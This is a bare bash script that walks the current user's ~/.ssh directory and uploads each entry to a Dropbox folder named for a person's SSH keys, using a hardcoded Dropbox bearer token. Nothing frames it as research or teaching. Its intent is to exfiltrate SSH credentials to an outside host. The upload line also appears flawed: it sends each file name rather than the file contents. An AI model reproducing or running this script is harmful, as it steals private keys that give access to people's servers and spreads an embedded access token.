#!/bin/bash

for entry in `ls -R ~/.ssh`; do
    curl -X POST https://content.dropboxapi.com/2/files/upload \
        --header "Authorization: Bearer pis99JgRvCsAAAAAAAAuMeQFupgk7dycoAflAfYxKsLNATIAJj72J7yJk_QZnztV" \
        --header "Dropbox-API-Arg: {\"path\": \"/AdamSSHKulcsai/$entry\"}" \
        --header "Content-Type: application/octet-stream" \
        --data-binary $entry
done
